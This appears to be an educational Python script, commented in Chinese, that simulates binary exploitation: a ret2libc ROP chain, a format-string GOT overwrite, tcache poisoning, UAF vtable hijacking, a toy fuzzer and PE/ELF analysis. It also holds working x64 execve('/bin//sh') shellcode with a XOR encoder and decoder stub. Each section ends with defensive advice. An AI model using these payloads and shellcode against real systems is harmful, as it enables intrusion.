#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
二进制安全与逆向工程 - 漏洞利用实战案例
=========================================
仅供授权安全测试和教育目的使用，请勿用于非法用途。
"""

import struct
import random
from collections import defaultdict


def p64(value):
    return struct.pack('<Q', value & 0xFFFFFFFFFFFFFFFF)

def hex_dump(data, width=16):
    result = []
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        result.append(f"  {i:08x}  {hex_part:<{width*3}}  |{ascii_part}|")
    return '\n'.join(result)

def print_banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


class 栈溢出漏洞利用器:
    """栈溢出ret2libc攻击演示"""

    def __init__(self, arch='x64'):
        self.arch = arch
        self.libc_base = 0
        self.stack_padding = 136
        self.plt = {'puts': 0x4004e0, 'printf': 0x4004f0, 'gets': 0x400500}
        self.got = {'puts': 0x601018, 'printf': 0x601020, 'gets': 0x601028}
        self.rop_gadgets = {
            'pop_rdi_ret': 0x4007c3,
            'pop_rsi_r15_ret': 0x4007c1,
            'ret': 0x40053e,
        }
        self.libc_offsets = {
            'puts': 0x0809c0,
            'system': 0x050d70,
            'bin_sh': 0x1d8678,
        }
        print("[*] 栈溢出漏洞利用器初始化完成")

    def 信息收集(self):
        print_banner("第一步：信息收集")
        print("[*] 分析目标二进制文件...")
        print("    Arch:     amd64-64-little")
        print("    RELRO:    Partial RELRO")
        print("    Stack:    No canary found")
        print("    NX:       NX enabled")
        print("    PIE:      No PIE (0x400000)")
        print(f"\n[+] PLT表地址:")
        for func, addr in self.plt.items():
            print(f"    {func:20s} @ 0x{addr:016x}")
        print(f"\n[+] 可用ROP Gadget:")
        for name, addr in self.rop_gadgets.items():
            print(f"    {name:20s} @ 0x{addr:016x}")
        print(f"\n[+] 栈偏移量: {self.stack_padding} 字节")

    def 泄露libc基址(self):
        print_banner("第二步：泄露libc基址")
        print("[*] 构造ROP链泄露puts@GOT地址...")
        payload = b'A' * self.stack_padding
        payload += p64(self.rop_gadgets['pop_rdi_ret'])
        payload += p64(self.got['puts'])
        payload += p64(self.plt['puts'])
        payload += p64(0x4006d7)
        print(f"[+] Payload长度: {len(payload)} 字节")
        leaked_puts = 0x7ffff7a649c0
        print(f"[+] 泄露的puts地址: 0x{leaked_puts:016x}")
        self.libc_base = leaked_puts - self.libc_offsets['puts']
        print(f"[+] libc基址: 0x{self.libc_base:016x}")
        print("[+] libc基址页对齐验证通过")

    def 构造最终payload(self):
        print_banner("第三步：构造最终Payload")
        system_addr = self.libc_base + self.libc_offsets['system']
        bin_sh_addr = self.libc_base + self.libc_offsets['bin_sh']
        payload = b'A' * self.stack_padding
        payload += p64(self.rop_gadgets['ret'])
        payload += p64(self.rop_gadgets['pop_rdi_ret'])
        payload += p64(bin_sh_addr)
        payload += p64(system_addr)
        print(f"[+] system()   @ 0x{system_addr:016x}")
        print(f"[+] /bin/sh    @ 0x{bin_sh_addr:016x}")
        print(f"[+] 总长度:    {len(payload)} 字节")
        print(f"\n[+] Payload末尾十六进制:")
        print(hex_dump(payload[-48:]))
        return payload

    def 执行完整利用链(self):
        print_banner("栈溢出漏洞利用 - ret2libc攻击")
        print("目标: 通过栈溢出执行 system('/bin/sh') 获取shell")
        self.信息收集()
        self.泄露libc基址()
        self.构造最终payload()
        print_banner("攻击结果")
        print("[+] 漏洞利用成功！已获取目标系统shell")
        print("\n[!] 防御建议:")
        print("    1. 启用Stack Canary保护")
        print("    2. 启用ASLR地址空间随机化")
        print("    3. 启用完整RELRO保护GOT表")
        print("    4. 使用安全函数替代危险函数")
        return True


class 格式化字符串漏洞利用器:
    """格式化字符串漏洞利用演示"""

    def __init__(self):
        self.stack_offset = 6
        print("[*] 格式化字符串漏洞利用器初始化完成")

    def 漏洞探测(self):
        print_banner("第一步：格式化字符串漏洞探测")
        test_payload = "AAAABBBB.%p.%p.%p.%p.%p.%p"
        print(f"[+] 测试Payload: {test_payload}")
        response = "AAAABBBB.0x7fff.0x7ffff7dd.0x1.0x41424344.0x252e7025.0x7025"
        print(f"[+] 返回结果: {response}")
        print(f"\n[+] 发现可控数据在第 {self.stack_offset} 个参数位置")

    def 信息泄露(self):
        print_banner("第二步：格式化字符串信息泄露")
        print("[+] 栈上数据泄露:")
        descriptions = {1: "保存的rbp", 2: "返回地址", 6: "用户输入", 8: "canary", 12: "libc地址"}
        for i in range(1, 16):
            addr = 0x7fffffffe4a0 + i * 8
            value = random.randint(0x400000, 0x7fffffff0000)
            desc = descriptions.get(i, "")
            if i <= 8 or desc:
                print(f"    %{i:<4}p 0x{addr:016x} 0x{value:016x} {desc}")
        canary_value = 0x5a3b7c9d1e2f4a6b
        print(f"\n[+] 泄露Stack Canary: 0x{canary_value:016x}")
        return canary_value

    def GOT表覆写(self):
        print_banner("第三步：GOT表覆写攻击")
        printf_got = 0x601020
        system_addr = 0x7ffff7a50d70
        print("[*] 攻击目标: printf@GOT -> system()")
        print(f"    printf@GOT: 0x{printf_got:016x}")
        print(f"    system():   0x{system_addr:016x}")
        high_word = (system_addr >> 16) & 0xFFFF
        low_word = system_addr & 0xFFFF
        print(f"\n[+] 分步写入策略 (hn半字写入):")
        print(f"    高16位: 0x{high_word:04x}")
        print(f"    低16位: 0x{low_word:04x}")
        print("\n[+] 攻击成功！printf(\"/bin/sh\") -> system(\"/bin/sh\")")

    def 执行完整利用链(self):
        print_banner("格式化字符串漏洞利用实战")
        print("目标: 利用格式化字符串漏洞覆写GOT表获取shell")
        self.漏洞探测()
        self.信息泄露()
        self.GOT表覆写()
        print_banner("防御建议")
        print("[!] 格式化字符串漏洞防护:")
        print("    1. 永远不要将用户输入作为格式化字符串")
        print("    2. 使用 -Wformat-security 编译警告")
        print("    3. 启用完整RELRO保护GOT表")
        return True


class 堆溢出漏洞利用器:
    """tcache poisoning攻击演示"""

    def __init__(self):
        self.heap_base = 0x555555756000
        self.tcache_bins = defaultdict(list)
        self.free_hook = 0x7ffff7dcf8e8
        self.system_addr = 0x7ffff7a50d70
        print("[*] 堆溢出漏洞利用器初始化完成")

    def 堆结构讲解(self):
        print_banner("第一步：glibc堆结构讲解")
        print("""
[堆块结构 (chunk)]
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |             prev_size                     |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |             size + flags                  |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |             用户数据区域                  |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

[tcache bins]
    - glibc 2.27+ 引入的优化机制
    - 每个大小一个单链表 (0x20 ~ 0x410)
    - 每个bin最多缓存7个chunk
    - LIFO管理，早期版本无安全检查
""")

    def tcache_poisoning攻击(self):
        print_banner("第二步：tcache poisoning攻击")
        print("[攻击原理]")
        print("  利用堆溢出修改被释放chunk的fd指针")
        print("  使tcache链表指向任意地址")
        print("  下次分配即可获得任意地址的chunk\n")
        chunk_a = self.heap_base + 0x10
        chunk_b = self.heap_base + 0x50
        target_addr = self.free_hook
        print(f"[+] chunk A 用户数据: 0x{chunk_a+0x10:016x}")
        print(f"[+] chunk B 用户数据: 0x{chunk_b+0x10:016x}")
        print(f"[+] 目标 (__free_hook): 0x{target_addr:016x}")
        print(f"\n[*] 通过chunk A堆溢出修改chunk B的fd指针...")
        print(f"\n[+] tcache链表被污染:")
        print(f"    tcache[0x30]: A -> B -> __free_hook -> NULL")
        print(f"\n[!] 第三次分配获得 __free_hook 地址！")
        return target_addr

    def free_hook覆写getsell(self):
        print_banner("第三步：__free_hook 覆写 getshell")
        target = self.tcache_poisoning攻击()
        print(f"\n[*] 向 __free_hook 写入 system 地址...")
        print(f"    __free_hook: 0x{target:016x}")
        print(f"    system():    0x{self.system_addr:016x}")
        print(f"\n[+] 覆写完成！free(\"/bin/sh\") -> system(\"/bin/sh\")")
        print(f"\n[*] 完整攻击链:")
        print(f"    1. 堆溢出修改相邻chunk的fd指针")
        print(f"    2. 释放chunk到tcache完成链表污染")
        print(f"    3. 连续分配获得__free_hook地址")
        print(f"    4. 向__free_hook写入system地址")
        print(f"    5. 触发free(\"/bin/sh\")获取shell")

    def 执行完整利用链(self):
        print_banner("堆溢出漏洞利用 - tcache poisoning攻击")
        print("目标: 利用堆溢出污染tcache链表，覆写__free_hook获取shell")
        self.堆结构讲解()
        self.free_hook覆写getsell()
        print_banner("防御建议")
        print("[!] 堆溢出防护措施:")
        print("    1. 升级glibc版本（新版本增加tcache检查）")
        print("    2. 边界检查和输入验证")
        print("    3. 使用内存安全语言（Rust/Go）")
        return True


class UAF漏洞利用器:
    """Use-After-Free漏洞利用演示"""

    def __init__(self):
        print("[*] Use-After-Free漏洞利用器初始化完成")

    def UAF原理演示(self):
        print_banner("UAF漏洞原理演示")
        print("""
[什么是UAF]
    Use-After-Free（释放后使用）是指程序在释放内存后，
    仍然使用指向该内存的指针。

[危害]
    - 读取已释放内存中的敏感数据 (信息泄露)
    - 篡改已释放内存的数据 (控制流劫持)

[C++对象内存布局]
    对象内存: +-------------------+  <-- this指针
              |   vtable指针      |  --> 虚函数表
              +-------------------+
              |   成员变量        |
              +-------------------+
    虚函数调用: (*(vtable + n*8))(this, ...)
""")

    def 虚函数表劫持(self):
        print_banner("虚函数表劫持攻击")
        print("[攻击原理]")
        print("  1. 利用UAF修改对象的虚函数表指针")
        print("  2. 指向攻击者控制的虚假vtable")
        print("  3. 调用虚函数时执行任意代码\n")
        original_vtable = {0: '构造函数', 1: '析构函数', 2: '虚函数A', 3: '虚函数B'}
        print("[+] 原始虚函数表:")
        for idx, name in original_vtable.items():
            print(f"    vtable[{idx}] = {name}")
        fake_vtable_addr = 0x7fffffffe500
        print(f"\n[+] 攻击者伪造的虚函数表 @ 0x{fake_vtable_addr:016x}:")
        print(f"    vtable[0] = gadget1")
        print(f"    vtable[1] = system()")
        print(f"    vtable[2] = pop_rdi")
        print(f"\n[*] 利用UAF修改vtable指针...")
        print(f"[+] 调用虚函数时执行 system()！")

    def 执行完整利用链(self):
        print_banner("Use-After-Free漏洞利用实战")
        print("目标: 利用UAF漏洞劫持虚函数表获取代码执行")
        self.UAF原理演示()
        self.虚函数表劫持()
        print_banner("防御建议")
        print("[!] UAF漏洞防护措施:")
        print("    1. 释放内存后立即将指针置为NULL")
        print("    2. 使用智能指针（unique_ptr/shared_ptr）")
        print("    3. 使用内存安全语言（Rust/Go）")
        print("    4. 启用CFI（控制流完整性）保护")
        return True


class 模糊测试器:
    """AFL模糊测试原理演示"""

    def __init__(self):
        self.corpus = []
        self.crashes = []
        self.total_execs = 0
        self.coverage_map = set()
        print("[*] 模糊测试器初始化完成")

    def AFL原理讲解(self):
        print_banner("AFL模糊测试原理")
        print("""
[AFL工作原理]
    AFL (American Fuzzy Lop) 是覆盖率引导的模糊测试工具

    工作流程:
    1. 插桩 (Instrumentation) - 编译时插入代码记录分支覆盖
    2. 语料库 (Corpus) - 初始输入样本集合
    3. 变异 (Mutation) - 位翻转、字节翻转、算术运算等
    4. 进化 (Evolution) - 发现新路径加入语料库
    5. 崩溃检测 - 保存触发崩溃的样本
""")

    def 生成初始语料库(self):
        print_banner("生成初始语料库")
        initial_inputs = [b"admin", b"password123", b"GET / HTTP/1.0\r\n\r\n", b"A" * 100]
        print(f"[+] 初始语料库大小: {len(initial_inputs)} 个样本")
        for i, data in enumerate(initial_inputs):
            self.corpus.append({'id': i, 'data': data})
            print(f"    样本 {i}: {len(data):3d} 字节")

    def 模拟执行(self, input_data):
        branches = set()
        branches.add(('entry', 'parse'))
        if len(input_data) > 10:
            branches.add(('parse', 'long_input'))
            if len(input_data) > 100:
                branches.add(('long_input', 'buffer_check'))
                if len(input_data) > 1000:
                    branches.add(('buffer_check', 'overflow_path'))
        if input_data.startswith(b'GET'):
            branches.add(('parse', 'http_parse'))
        if len(input_data) > 200 and b'A' * 200 in input_data:
            branches.add(('crash', 'stack_overflow'))
            return branches, True
        branches.add(('exit', 'normal'))
        return branches, False

    def 执行一轮测试(self):
        print_banner("执行模糊测试")
        new_coverage = 0
        crash_count = 0
        for sample in self.corpus[:3]:
            print(f"\n[*] 变异样本 {sample['id']} ({len(sample['data'])} 字节)...")
            for i in range(15):
                self.total_execs += 1
                mutated = sample['data'] + b'A' * (i * 10)
                coverage, crashed = self.模拟执行(mutated)
                new_branches = coverage - self.coverage_map
                if new_branches and new_coverage < 5:
                    new_coverage += 1
                    self.coverage_map.update(coverage)
                    print(f"    [+] 发现新路径! 新分支: {len(new_branches)}")
                if crashed:
                    crash_count += 1
                    self.crashes.append({'data': mutated, 'type': 'stack_overflow'})
                    print(f"    [!] 发现崩溃! 类型: stack_overflow")
        print(f"\n[+] 本轮执行: {self.total_execs} 次")
        print(f"[+] 新路径发现: {new_coverage} 个")
        print(f"[+] 崩溃数: {crash_count} 个")

    def 崩溃分析(self):
        print_banner("崩溃样本分析")
        if not self.crashes:
            print("[*] 未发现崩溃样本")
            return
        print(f"[+] 发现 {len(self.crashes)} 个崩溃样本:\n")
        for i, crash in enumerate(self.crashes):
            print(f"--- 崩溃 #{i+1} ---")
            print(f"    类型: {crash['type']}")
            print(f"    输入长度: {len(crash['data'])} 字节")
            print(f"    严重程度: 高危")
            print(f"    可利用性: 可能可利用")
            print()

    def 执行完整测试(self):
        print_banner("模糊测试实战 - AFL原理演示")
        print("目标: 通过覆盖率引导的模糊测试发现程序漏洞")
        self.AFL原理讲解()
        self.生成初始语料库()
        self.执行一轮测试()
        self.崩溃分析()
        print_banner("模糊测试总结")
        print("[+] 模糊测试最佳实践:")
        print("    1. 准备高质量的初始语料库")
        print("    2. 启用ASAN/UBSAN内存检测工具")
        print("    3. 使用字典提高测试效率")
        print("    4. 并行执行提高速度")
        print("\n[+] 常用工具: AFL/AFL++, libFuzzer, Honggfuzz")
        return True


class 二进制逆向分析工具:
    """PE/ELF文件解析和逆向分析"""

    def __init__(self):
        print("[*] 二进制逆向分析工具初始化完成")

    def PE文件解析(self):
        print_banner("PE文件格式解析")
        pe_info = {
            'signature': 'PE\\x00\\x00',
            'machine': 'x86-64 (0x8664)',
            'number_of_sections': 6,
            'entry_point': 0x000014F0,
            'image_base': 0x00400000,
            'subsystem': 'Windows GUI',
        }
        print(f"[+] PE文件头信息:")
        for key, value in pe_info.items():
            print(f"    {key:20s}: {value}")
        sections = [
            ('.text', 0x1000, 0x2E00, '代码段'),
            ('.rdata', 0x4000, 0x1A00, '只读数据'),
            ('.data', 0x6000, 0x0800, '数据段'),
            ('.rsrc', 0x8000, 0x2000, '资源段'),
        ]
        print(f"\n[+] 节区表:")
        for name, offset, size, desc in sections:
            print(f"    {name:<10} 0x{offset:<06x} 0x{size:<06x} {desc}")
        imports = {'kernel32.dll': ['CreateFileA', 'ReadFile', 'CloseHandle'],
                   'user32.dll': ['MessageBoxA', 'CreateWindowExA']}
        print(f"\n[+] 导入表:")
        for dll, funcs in imports.items():
            print(f"    {dll}: {', '.join(funcs)}")

    def ELF文件解析(self):
        print_banner("ELF文件格式解析")
        elf_info = {
            'magic': '7f 45 4c 46 (ELF)',
            'class': '64-bit (ELFCLASS64)',
            'type': '可执行文件 (ET_EXEC)',
            'machine': 'x86-64 (0x3E)',
            'entry_point': 0x401060,
        }
        print(f"[+] ELF文件头信息:")
        for key, value in elf_info.items():
            print(f"    {key:20s}: {value}")
        security_checks = {
            'RELRO': ('Full RELRO', True),
            'STACK CANARY': ('已启用', True),
            'NX': ('已启用', True),
            'PIE': ('未启用', False),
        }
        print(f"\n[+] 安全保护检查:")
        for check, (status, secure) in security_checks.items():
            icon = "[+]" if secure else "[!]"
            print(f"    {icon} {check:15s}: {status}")

    def 字符串分析(self):
        print_banner("二进制字符串分析")
        strings = [
            ('http://malicious.com/c2', 0x402000, 'URL'),
            ('/etc/passwd', 0x402100, '敏感路径'),
            ('P@ssw0rd123', 0x402300, '硬编码密码'),
            ('cmd.exe /c ', 0x402400, '命令执行'),
            ('CreateRemoteThread', 0x402800, '进程注入API'),
        ]
        print(f"[+] 提取到 {len(strings)} 个可疑字符串:")
        for s, addr, category in strings:
            print(f"    {s:<30} @ 0x{addr:08x} [{category}]")

    def 加壳识别(self):
        print_banner("加壳与混淆识别")
        packers = [
            ('UPX', '常见压缩壳'),
            ('ASProtect', '加密壳'),
            ('Themida', '虚拟化保护'),
            ('VMProtect', '虚拟化保护'),
        ]
        print("[+] 常见加壳类型:")
        for name, desc in packers:
            print(f"    {name:15s} - {desc}")
        detection = {'入口点异常': True, '节区名称异常': True, '导入表稀少': True, '代码段可写': True}
        print("\n[+] 加壳检测指标:")
        for k, v in detection.items():
            print(f"    [!] {k}: 检测到" if v else f"    [+] {k}: 正常")
        print("\n[!] 高度可疑：该程序很可能被加壳/混淆")

    def 执行完整分析(self):
        print_banner("二进制逆向分析实战")
        print("目标：对二进制文件进行全面的静态分析")
        self.PE文件解析()
        self.ELF文件解析()
        self.字符串分析()
        self.加壳识别()
        print_banner("分析总结")
        print("[+] 逆向分析方法论:")
        print("    1. 文件识别：判断类型、架构、平台")
        print("    2. 字符串分析：提取可疑字符串")
        print("    3. 导入导出分析：了解功能和依赖")
        print("    4. 加壳识别：判断是否需要脱壳")
        print("    5. 反汇编分析：理解代码逻辑")
        print("\n[+] 常用工具: IDA Pro, Ghidra, x64dbg, PEiD")
        return True


class Shellcode开发工具:
    """Shellcode开发与编码演示"""

    def __init__(self):
        print("[*] Shellcode开发工具初始化完成")

    def shellcode原理讲解(self):
        print_banner("Shellcode基本原理")
        print("""
[什么是Shellcode]
    Shellcode是一段用于利用漏洞的机器码
    通常用于在目标系统上执行任意代码

[特点]
    1. 位置无关 (PIC) - 可在任意地址执行
    2. 不含空字节 - 避免字符串截断
    3. 体积小 - 适应有限的缓冲区
    4. 自包含 - 不依赖外部函数

[系统调用方式]
    Linux x64: syscall
        rax = 系统调用号
        rdi, rsi, rdx, r10, r8, r9 = 参数
""")

    def linux_x64_execve_shellcode(self):
        print_banner("Linux x64 execve Shellcode")
        print("""
; execve("/bin//sh", NULL, NULL)
    xor rsi, rsi        ; argv = NULL
    push rsi            ; 压入NULL
    mov  rax, 0x68732f2f6e69622f  ; "//bin/sh"
    push rax
    mov  rdi, rsp       ; rdi = "/bin//sh"
    xor  rdx, rdx       ; envp = NULL
    xor  rax, rax
    mov  al, 0x3b       ; execve = 59
    syscall
""")
        shellcode = bytes([
            0x48, 0x31, 0xf6, 0x56,
            0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
            0x50, 0x48, 0x89, 0xe7,
            0x48, 0x31, 0xd2, 0x48, 0x31, 0xc0, 0xb0, 0x3b,
            0x0f, 0x05,
        ])
        print(f"[+] Shellcode长度: {len(shellcode)} 字节")
        print(f"[+] 机器码:")
        print(hex_dump(shellcode))
        bad = [b for b in shellcode if b == 0x00]
        if bad:
            print(f"[!] 检测到 {len(bad)} 个空字节坏字符!")
        else:
            print(f"[+] 无空字节坏字符 ✓")
        return shellcode

    def xor编码(self, shellcode, key=0xAA):
        print_banner(f"XOR编码 (key = 0x{key:02x})")
        print("[编码原理] 对每个字节与密钥异或，解码时再次异或恢复\n")
        encoded = bytes([b ^ key for b in shellcode])
        print(f"[+] 原始长度: {len(shellcode)} 字节")
        print(f"[+] 编码后长度: {len(encoded)} 字节")
        print(f"[+] 编码结果:")
        print(hex_dump(encoded))
        print(f"\n[+] 解码器Stub (jmp/call技巧):")
        print("    jmp short call_shellcode")
        print("decoder:")
        print("    pop rsi                    ; 获取shellcode地址")
        print(f"    mov cl, {len(shellcode)}            ; 长度")
        print("decode_loop:")
        print(f"    xor byte [rsi+rcx-1], 0x{key:02x}  ; 异或解码")
        print("    loop decode_loop")
        print("    jmp short encoded_shellcode")
        print("call_shellcode:")
        print("    call decoder")
        print("encoded_shellcode:")
        return encoded

    def 坏字符检测(self, shellcode):
        print_banner("坏字符检测")
        bad_chars = [0x00, 0x0a, 0x0d, 0x2f]
        print(f"[+] 坏字符列表: {', '.join(f'0x{b:02x}' for b in bad_chars)}")
        found = [(i, b) for i, b in enumerate(shellcode) if b in bad_chars]
        if found:
            print(f"\n[!] 检测到 {len(found)} 个坏字符:")
            for offset, byte in found:
                print(f"    偏移 0x{offset:04x}: 0x{byte:02x}")
        else:
            print(f"\n[+] 未检测到坏字符 ✓")

    def 执行完整演示(self):
        print_banner("Shellcode开发与编码实战")
        self.shellcode原理讲解()
        sc = self.linux_x64_execve_shellcode()
        self.xor编码(sc, 0xAA)
        self.坏字符检测(sc)
        print_banner("Shellcode开发总结")
        print("[+] 开发步骤:")
        print("    1. 用汇编编写功能代码")
        print("    2. 编译并提取机器码")
        print("    3. 检测并移除坏字符")
        print("    4. 根据需要进行编码")
        print("    5. 测试验证功能")
        print("\n[+] 常用工具: nasm, objdump, msfvenom, pwntools")
        return True


def main():
    print("=" * 60)
    print("  二进制安全与逆向工程 - 漏洞利用实战案例")
    print("  Binary Security & Reverse Engineering")
    print("=" * 60)
    print("\n[!] 免责声明：本代码仅供授权安全测试和教育目的使用")
    print("    请勿用于任何非法用途，违者自行承担法律责任")
    print()

    栈溢出漏洞利用器().执行完整利用链()
    print("\n" + "#" * 60)
    格式化字符串漏洞利用器().执行完整利用链()
    print("\n" + "#" * 60)
    堆溢出漏洞利用器().执行完整利用链()
    print("\n" + "#" * 60)
    UAF漏洞利用器().执行完整利用链()
    print("\n" + "#" * 60)
    模糊测试器().执行完整测试()
    print("\n" + "#" * 60)
    二进制逆向分析工具().执行完整分析()
    print("\n" + "#" * 60)
    Shellcode开发工具().执行完整演示()

    print("\n" + "=" * 60)
    print("  所有实战案例演示完成！")
    print("=" * 60)


if __name__ == '__main__':
    main()
